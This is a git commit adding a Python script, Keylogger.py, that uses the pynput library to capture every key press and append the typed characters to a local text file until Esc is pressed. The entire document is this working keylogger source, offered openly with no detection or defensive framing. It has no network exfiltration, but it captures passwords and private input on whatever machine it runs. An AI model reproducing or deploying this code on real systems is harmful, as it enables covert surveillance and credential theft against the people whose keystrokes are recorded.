19ea6c1467a4b12dbaf2d98fab4b4e95e3245315
ObliviousParadigm <adarshsdda@gmail.com>
2020-05-19 00:22:31 +0530

    First commit

---
+++ Keylogger.py
@@ -0,0 +1,34 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    # print("{0} pressed".format(key))
+
+    if count >= 5:
+        count = 0
+        write_file(keys)
+        keys.clear()
+
+def write_file(keys):
+    with open("Keypress.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find('Key') == -1:
+                f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
